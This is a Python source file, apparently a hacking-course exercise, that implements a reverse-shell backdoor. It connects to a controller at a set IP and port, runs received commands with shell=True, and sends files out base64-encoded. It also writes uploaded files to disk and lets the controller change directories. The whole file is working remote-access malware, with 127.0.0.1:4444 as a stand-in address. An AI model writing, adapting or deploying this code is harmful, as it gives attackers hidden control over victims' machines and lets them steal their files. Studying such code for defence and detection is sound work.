# Many thanks to thenewboston, zaid sabih and udemy.com
# Created by foxsinofgreed
import socket, json, os, sys
import subprocess
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def change_working_dir(self, path):
        os.chdir(path)
        print("[+] Changed Working Directory" + os. getcwd())
        return "[+] Changed Working Directory" + os. getcwd()

    def exec_sys_comm(self, cmd):
        try:
            result = subprocess.check_output(cmd, shell=True)
            result = str(result, 'utf-8')
            print(result)
            return result
        except Exception as exception:
            return "[-] Error in executing command\n"+str(exception)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data = bytes(json_data, 'utf-8')
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024), 'utf-8')
                json_data = json.loads(json_data)
                break
            except json.decoder.JSONDecodeError:
                continue

        return json_data

    def readfiles(self, path):
        with open(path, 'rb') as file:
            print("file " + path)
            # rb because we wanna read file as binary
            content = file.read()
            print("content\n" + str(content))
            content = base64.b64encode(content)
            print("content\n"+str(content))
            content = str(content)
            return content

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            content = content[2:-1]
            content = base64.b64decode(content)
            file.write(content)
            try:
                return "[+] Written to file\n" + path + "\ncontent\n" + str(content) + "\nDownload Complete\n"
            except:
                return "[+] Written to file\n" + path + "\nDownload Complete\n"

    def run(self):
        while True:
            command_result = ""
            command = self.reliable_receive()
            command_list = command.split(" ")
            if command_list[0] == "quit" or command_list[0] == "exit":
                break
            elif command_list[0] == "cd" and len(command_list) > 1:
                command_result = self.change_working_dir(command_list[1])
            elif command_list[0] == "download":
                command_result = self.readfiles(command_list[1])
            elif command_list[0] == "upload":
                print(command_list)
                command_result = self.write_file(command_list[1], command_list[2])
            else:
                command_result = self.exec_sys_comm(command)

            print(command)
            self.reliable_send(command_result)

        self.connection.close()
        sys.exit()


my_backdoor = Backdoor("127.0.0.1", 4444)
my_backdoor.run()
